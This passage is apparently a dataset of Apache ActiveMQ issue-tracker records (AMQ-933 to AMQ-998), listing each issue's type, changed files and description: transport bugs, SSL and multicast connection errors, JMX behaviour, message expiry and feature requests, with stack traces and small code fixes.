Connections to the openwire port that are pathologically broken (for example any http request) or that die in some other way extremely quickly will lead to memory losses of aout 64Kb each time. This happens because many services are stop()ed directly in the middle of start(), and then never stopped for real, or stopped again but on an object tree with an inconsistent state. This is usually also accompanied by the JMX message:WARN  ManagedTransportConnection     - Failed to unregister mbean: org.apache.activemq:BrokerName=localhost,Type=Connection,ConnectorName=default,Connection=25But that is a cosmetic symptom and not critical (and this has otherwise nothing to do with JMX).My patch is a band-aid that is functional but I"m not very happy with it. The patch changes some service logic so that if stop is called in the middle of start, the stop is instead queued and called at the end of start. There will still be multiple stops, and you"ll still see the cosmetic JMX error from the second ineffectual stop, but the first stop cleans up correctly so there are no leaks.I think there"s probably a better solution, but it was tough to see what. I"d appreciate better ideas. Possibly something involving moving the dangerous operations (wire format negotiation etc) out of start?I am working on a unit test, but I can"t promise I will have something to submit. I"m having to play JVM games to detect the problem in a unit test and that might not fly for general purpose use.
issueID:AMQ-933
type:Bug
changed files:TcpTransport.java
texts:ssl:// protocol broken on the client side: get a java.net.SocketException: Unconnected sockets not implemented
producer:     &#91;echo&#93; Running producer against server at $url = ssl://localhost:61617 for subject $subject = TEST.FOO     &#91;java&#93; Connecting to URL: ssl://localhost:61617     &#91;java&#93; Publishing a Message with size 1000 to queue: TEST.FOO     &#91;java&#93; Using non-durable publishing     &#91;java&#93; Sleeping between publish 0 ms     &#91;java&#93; Caught: javax.jms.JMSException: Could not connect to broker URL: ssl://localhost:61617. Reason: java.net.SocketException: Unconnected sockets not implemented     &#91;java&#93; javax.jms.JMSException: Could not connect to broker URL: ssl://localhost:61617. Reason: java.net.SocketException: Unconnected sockets not implemented     &#91;java&#93;     at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:32)     &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:252)          &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:211)          &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:158)     &#91;java&#93;     at ToolSupport.createConnection(Unknown Source)     &#91;java&#93;     at ProducerTool.run(Unknown Source)     &#91;java&#93;     at ProducerTool.runTool(Unknown Source)     &#91;java&#93;     at ProducerTool.main(Unknown Source)     &#91;java&#93; Caused by: java.net.SocketException: Unconnected sockets not implemented     &#91;java&#93;     at javax.net.SocketFactory.createSocket(SocketFactory.java:97)     &#91;java&#93;     at org.apache.activemq.transport.tcp.TcpTransport.<init>(TcpTransport.java:80)     &#91;java&#93;     at org.apache.activemq.transport.tcp.TcpTransportFactory.createTcpTransport(TcpTransportFactory.java:130)          &#91;java&#93;     at org.apache.activemq.transport.tcp.TcpTransportFactory.createTransport(TcpTransportFactory.java:115)          &#91;java&#93;     at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:115)     &#91;java&#93;     at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:42)     &#91;java&#93;     at org.apache.activemq.transport.TransportFactory.connect(TransportFactory.java:76)     &#91;java&#93;     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:223)          &#91;java&#93;     ... 6 more
issueID:AMQ-935
type:New Feature
changed files:
texts:Port the JmsLogAppender API from ActiveMQ 3.2.4 to ActiveMQ 4.1
Porting the following classes from ACTIVEMQ_3_2_4: modules/core/src/test/org/activemq/util/test-log4j.propertiesmodules/core/src/java/org/activemq/util/JmsLogAppender.javamodules/core/src/java/org/activemq/util/JmsLogAppenderSupport.javamodules/core/src/java/org/activemq/util/JndiJmsLogAppender.javamodules/core/src/test/org/activemq/util/JmsLogAppenderTest.javato ActiveMQ 4.1: activemq-optional/src/test/java/org/apache/activemq/utilactivemq-optional/src/test/java/org/apache/activemq/util/JmsLogAppenderTest.javaactivemq-optional/src/test/resources/test-log4j.propertiesactivemq-optional/src/main/java/org/apache/activemq/utilactivemq-optional/src/main/java/org/apache/activemq/util/JndiJmsLogAppender.javaactivemq-optional/src/main/java/org/apache/activemq/util/JmsLogAppenderSupport.javaactivemq-optional/src/main/java/org/apache/activemq/util/JmsLogAppender.java
issueID:AMQ-936
type:Bug
changed files:JmsSendReceiveWithMessageExpiration.java
texts:Expired Messages being delivered
I have a sample app that sends a message to a queue, that has producer.setTimeToLive(5000);I take this to mean that any message sent via this producer will expire after 5 secondsWhen I attach a consumer and try to consume after ay 10 seconds the messages are delivered.
issueID:AMQ-938
type:New Feature
changed files:
texts:Support extending the activemq classpath with the ACTIVEMQ_CLASSPATH variable and overriding of the SUNJMX
This will allow folks to be able to customized thier run enviorment without having to modify the activemq start script
issueID:AMQ-940
type:Bug
changed files:
texts:JMSXUserId not set when using a JAAS login module
The JMSXUserID field is not set when using a JAAS login module.A unit test that fails and a bugfix are attached.
issueID:AMQ-942
type:Bug
changed files:
texts:ActiveMQStreamMessage should support large text format in writeString.
I was wondering if ActiveMQStreamMessage should support large text messages also, since MapMessage is also able to support this.
issueID:AMQ-943
type:Improvement
changed files:
texts:Pluggable Stomp Message Mapping
I have finally found time to finish this. Here"s the draft version of the Pluggable Stomp Message Mapping implementation.Few notes: New interface has been defined: ProtocolMapping (I wanted to use the same name as the message header that we check) There are two implementations of this interface: DefaultProtocolMapping and ByteProtocolMapping I used FactoryFinder to create appropriate mapper. The finder use the following path to find keys: META-INF/services/org/apache/activemq/transport/mapping/ (we can change this if you want) The appropriate mapper is used according to the "protocol-mapping" header in the CONNECT message. For example protocol-mapping:byte for ByteProtocolMapping handler. Currently I have implemented only the mapper for BytesMessage since I wasn"t sure whether you want to integrate JSON mapper for MapMessages or distribute it in a separate library. I have changed the test case that tests subscription for byte messages This solution is not compatible with current mapping for byte messages. If you want backward compatibility, I can hard-code it in a ProtocolConverter class (as it was) since it could not be implemented through this mechanism.TODO: test it more (create more unit test cases and test it more in a real environment) create a proper documentation so others can create their handlers. create a proper JavaDoc documentation for key interfaces and classes create JSON mapper (integrated or external) fix STOMP client(s)Give it a try and let me know your impressionsDejan Bosanac
issueID:AMQ-944
type:Bug
changed files:MulticastDiscoveryAgentFactory.java
texts:transportConnector using multicast
It seems that one can nto use multicast in a transportConnector.Description of the test:In the distribution, go into /exampleEdit the build.xml in order to use multicast. for instanceChange the URL in the build.xml to :<property name="url" value="multicast://225.0.0.1:61620" />Start the producer: ant producerHere is the output:    &#91;echo&#93; Running producer against server at $url = multicast://225.0.0.1:61620 for subject $subject = Syntheses    &#91;java&#93; Connecting to URL: multicast://225.0.0.1:61620    &#91;java&#93; Publishing a Message with size 1000 to queue: Syntheses    &#91;java&#93; Using non-durable publishing    &#91;java&#93; Sleeping between publish 0 ms    &#91;java&#93; DEBUG MulticastTransport             - Joining multicast address: /225.0.0.1    &#91;java&#93; DEBUG UdpTransport                   - Consumer thread starting for: multicast://225.0.0.1:61620@0    &#91;java&#93; DEBUG UdpTransport                   - Sending oneway from: multicast://225.0.0.1:61620@0 to target: /225.0.0.1:61620 command: ConnectionInfo {commandId = 1, responseRequired = true, connectionId = ID:ZOZMA-2042-1159347487015-0:0, clientId = ID:ZOZMA-2042-1159347487015-1:0, userName = null, password = null, brokerPath = null, brokerMasterConnector = false, manageable = true}    &#91;java&#93; DEBUG DefaultReplayBuffer            - Adding command ID: 1 to replay buffer: org.apache.activemq.transport.reliable.DefaultReplayBuffer@1b3f829 object: [B@698403    &#91;java&#93; DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 sending datagram: 1 to: /225.0.0.1:61620    &#91;java&#93; DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 about to process: ConnectionInfo {commandId = 1, responseRequired = true, connectionId = ID:ZOZMA-2042-1159347487015-0:0, clientId = ID:ZOZMA-2042-1159347487015-1:0, userName = null, password = null, brokerPath = null, brokerMasterConnector = false, manageable = true}    &#91;java&#93; DEBUG ReliableTransport              - Still waiting for response on: multicast://225.0.0.1:61620@0 to command: ConnectionInfo {commandId = 1, responseRequired = true, connectionId = ID:ZOZMA-2042-1159347487015-0:0, clientId = ID:ZOZMA-2042-1159347487015-1:0, userName = null, password = null, brokerPath = null, brokerMasterConnector = false, manageable = true} sending replay message    &#91;java&#93; DEBUG UdpTransport                   - Sending oneway from: multicast://225.0.0.1:61620@0 to target: /192.9.211.39:61620 command: ReplayCommand {commandId = 2, firstNakNumber = 1, lastNakNumber = 1}    &#91;java&#93; DEBUG DefaultReplayBuffer            - Adding command ID: 2 to replay buffer: org.apache.activemq.transport.reliable.DefaultReplayBuffer@1b3f829 object: [B@d02b51    &#91;java&#93; DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 sending datagram: 2 to: /192.9.211.39:61620    &#91;java&#93; DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 about to process: ReplayCommand {commandId = 2, firstNakNumber = 1, lastNakNumber = 1}    &#91;java&#93; DEBUG ReliableTransport              - Processing replay command: ReplayCommand {commandId = 2, firstNakNumber = 1, lastNakNumber = 1}    &#91;java&#93; DEBUG DefaultReplayBuffer            - Buffer: org.apache.activemq.transport.reliable.DefaultReplayBuffer@1b3f829 replaying messages from: 1 to: 1 &#91;java&#93; DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 REDELIVERING datagram: 1 to: /225.0.0.1:61620*
issueID:AMQ-950
type:Bug
changed files:ManagementContext.java
texts:createConnector="false" has no effect on Tiger
On Tiger, activemq always creates a rmi connector on port 1099 no matter what I do with -Djavax.management... and <managementContext/>In particular, setting createConnector="false" should prevent AMQ from setting up its own connector, but it does not.The problem is in the findMBeanServer() method:            if (result == null && createMBeanServer) {                result = createMBeanServer();            }            else {                createConnector(result);            }result is not null on Tiger with useJmx="true", and createConnector is not protected by if(createConnector) like it is on the non-Tiger flow.The fix (I think) is simply to do this:            if (result == null && createMBeanServer) {                result = createMBeanServer();            }            else {                if(createConnector){                      createConnector(result);                }            }
issueID:AMQ-953
type:Bug
changed files:
texts:ActiveMQ standalone sever does not start in Windows
When you use the activemq.bat file in the bin directory of the 4.0.2 distribution you get one of the following errors:C:incubator-activemq-4.0.2in>activemqACTIVEMQ_HOME: .Failed to execute main task. Reason: java.lang.ClassNotFoundException: org.apache.activemq.console.command.ShellCommandandACTIVEMQ_HOME: .Loading message broker from: xbean:activemq.xmlERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanDefinitionStoreException: Error registering bean with name "org.apache.activemq.xbean.XBeanBrokerService" defined in class path resource [activemq.xml]: Could not resolve placeholder "activemq.home"ERROR: java.lang.Exception: org.springframework.beans.factory.BeanDefinitionStoreException: Error registeringbean with name "org.apache.activemq.xbean.XBeanBrokerService" defined in class path resource [activemq.xml]: Could not resolve placeholder "activemq.home"
issueID:AMQ-956
type:Improvement
changed files:
texts:Build Issue on snapshot timestamp when downloading transitive dependencies.
There are instances when build is unable to download an activemq transitive dependencies due to difference in the snapshot timestamp.
issueID:AMQ-958
type:New Feature
changed files:
texts:Supprot a create=false option on the vm://localhost transport so that the connect fails if the broker is not allready running
None
issueID:AMQ-959
type:Bug
changed files:MessageId.java
Message.java
texts:Wrong message removed from store when using composite destinations
When sending messages to composite destinations, for each simple destination a copy of the original message is created an sent. However, it"s internal messageId is reused. As the messageId carries the brokerSequenceId, which is used as primary key in the jdbc message store, this is overwritten by the last send. All messages refer to the same store row so that the first acknowledge removes the content for all MessageReferences in memory.The attached patch creates a copy of the messageId when copying a message.Regards,Holger
issueID:AMQ-960
type:Improvement
changed files:TextFileCertificateLoginModule.java
CertificateLoginModule.java
texts:Improved error reporting for SSL and transports. Changed Username for SSL cert to the DN
The attached patch provides better error reporting for transport errors by reporting the host which was trying to connect.It also provides a toString for SslTransport to distinguish it from the regular tcp transport, and includes some improved javadoc for the new SSL client certificate authentication feature.Additionally, it changes the username reported through the JMSXUserId field to be the full distinguished name rather than the username mapped in the users properties file.
issueID:AMQ-961
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Problem with subscription passing with network of brokers in AMQ 4.0.2
There"s an occasional problem with subscription propagation when using a network of brokers.  Test scenario uses ConsumerTool and PublisherTool in examples area of distribution.1) Start broker A (has a network connection to broker B)2) Start broker B (has a network connection to broker A)3) start consumer C against broker A, on FOO4) start publisher P against broker B, on FOOMessages do not flow to consumer C.  In the broker B log, there"s no indication it got any subscriptions from broker A.  Again, this is occasional.I"ve taken a kill-3 on the brokers, both when this condition appears, and when everything is fine.  There"s an obvious difference in one of the threads that hopefully will bring light to the problem.  I"ve not gone into the code yet to try and find the issue, but figured I would open this issue first.Stack trace of broker A when subscriptions did NOT pass, and message flow is broken:"ActiveMQ Transport: tcp://perfgc1a/170.137.15.169:5112" prio=10 tid=0x0030e160 nid=0x3f in Object.wait() [0x8e2ff000..0x8e2ff8f0]        at java.lang.Object.wait(Native Method) waiting on <0x9b2b00d0> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)        at java.lang.Object.wait(Object.java:474)        at edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch.await(CountDownLatch.java:179) locked <0x9b2b00d0> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)        at org.apache.activemq.network.DemandForwardingBridgeSupport.waitStarted(DemandForwardingBridgeSupport.java:830)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:329)        at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:130)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:92)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)        at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:117)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:124)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:123)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:88)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137)        at java.lang.Thread.run(Thread.java:595)Stack trace of broker A when everything works correctly:"ActiveMQ Transport: tcp://perfgc1a/170.137.15.169:5112" prio=10 tid=0x01955fc8 nid=0x3f runnable &#91;0x8e2cf000..0x8e2cfaf0&#93;        at java.net.SocketInputStream.socketRead0(Native Method)        at java.net.SocketInputStream.read(SocketInputStream.java:129)        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:49)        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:56)        at java.io.DataInputStream.readInt(DataInputStream.java:353)        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:275)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)        at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-967
type:Bug
changed files:
texts:setting maximumRedeliveries to -1 is equivalent to maximumRedeliveries=0, but doc says otherwise
The documentation (http://incubator.apache.org/activemq/resource-adapter-properties.html) suggests that setting maximumRedeliveries to -1 means "no maximum", i.e. infinite retries.However, my tests (and the code) show that -1 is equivalent to 0 (i.e. no redelivery).The patch attempts to fix this.
issueID:AMQ-976
type:Improvement
changed files:
texts:Abstract the Transport and TransportListener Interfaces so that the move around Objects instead of Command and Response objects.
If the Transport and TransportListener interfaces can be abstracted even more so that they move around Objects instead of Commands and Responses.  This would allow us to use most of the Transport components with other command sets besides the current ActiveMQ one.The main use case I"m thinking of is the possibility of supporting the qpid command set directly by the broker.
issueID:AMQ-978
type:Bug
changed files:StompSubscription.java
LegacyFrameTranslator.java
texts:No Messaged delivery when mixing Perl stomp client Producer/Consumer and Java JMS Producer/Consumer
Facts: Perl Stomp client Producer and Consumer works fine           Java JMS client Producer and Consumer works fineI have also used other Perl Stomp protocol implementation with no problem.The problem happens when I mix Java and Perl clientsScenario Test 1:A. Perl Stomp client ConsumerB. Java JMS client ProducerScenario Test 2:A. Java JMS client ConsumerB. Perl Stomp client ProducerI have looked into it via Java JMX management jconsole, and it seems to me there is a wall betweenthe stomp server and default server. It the stomp server only passes messages coming from stomp lientsand default server also does the same.If this is truly the case, and this is by design, I will be very disappointed. There should not be any wall.A message is message irrespective of its source and should be delivered to any one that is listeningon the same destination.I will attach the Perl clients testcases.For Java client,  a simple JMS client Producer and Consumer with the same topic used asthe perl side will do the job. The topic I used on the perl side: "/topic/Test.CrossDelivery"and the Java side topic is  "Test.CrossDelivery"This problem is a show stopper for us.
issueID:AMQ-980
type:Bug
changed files:
texts:lastImageSubscriptionRecoveryPolicy does not work with wildcards
The lastImageSubscriptionRecoveryPolicy does not appear to work with wildcards.In the following example, a new consumer only receives one message for the topics covered by the wildcard instead of receiving one message for each topic.config file:-           <policyEntry topic="PRICES.>">             <subscriptionRecoveryPolicy>               <lastImageSubscriptionRecoveryPolicy/>             </subscriptionRecoveryPolicy>           </policyEntry> consumer subscription:-           GetTopic("PRICES.>?consumer.retrocactive=true");
issueID:AMQ-983
type:Bug
changed files:Scheduler.java
texts:Inactivity Monitor causes a InterruptedException in broker when connection is disconnected
None
issueID:AMQ-984
type:Improvement
changed files:
texts:make the "slave" status of a broker available through JMX (in jdbc-master-slave mode)
Right now, it is not possible to know that a broker is in "Attempting to acquire the exclusive lock to become the Master broker" mode via JMX, even though this would be a natural place to find out.Do you think it would be possible to expose the DatabaseLocker or the JDBCPersistenceAdapter over JMX so that a simple boolean isMaster() can be queried?
issueID:AMQ-997
type:New Feature
changed files:
texts:Use the ACTIVEMQ_BASE environment variable to support running multiple broker instances from he same activemq install
The activemq startup shell scripts are allready using / find the ACTIVEMQ_HOME which is where AcitiveMQ has been installed.  Currently, you can only run one instance of the broker per ActiveMQ installation directory.  We should support running multiple broker instances using that same ACTIVEMQ_HOME.  All the per broker instance variable data should be relative to a new ACTIVEMQ_BASE enviroment variable.By default the ACTIVEMQ_BASE == ACTIVEMQ_HOME so that sarting up the default activemq instance continues to behave as it allways has.Createing a new per instance directory, as admin should only have to do:export ACTIVEMQ_BASE=/path/to/new/directorymkdir -p ${ACTIVEMQ_BASE}cp -R ${ACTIVEMQ_HOME}/conf ${ACTIVEMQ_BASE}customize the  ${ACTIVEMQ_BASE}/conf/activemq.xml file And to run the new instance:export ACTIVEMQ_BASE=/path/to/new/directory${ACTIVEMQ_HOME}/bin/activemq
issueID:AMQ-998
type:New Feature
changed files:
texts:add support for stomp+ssl
None
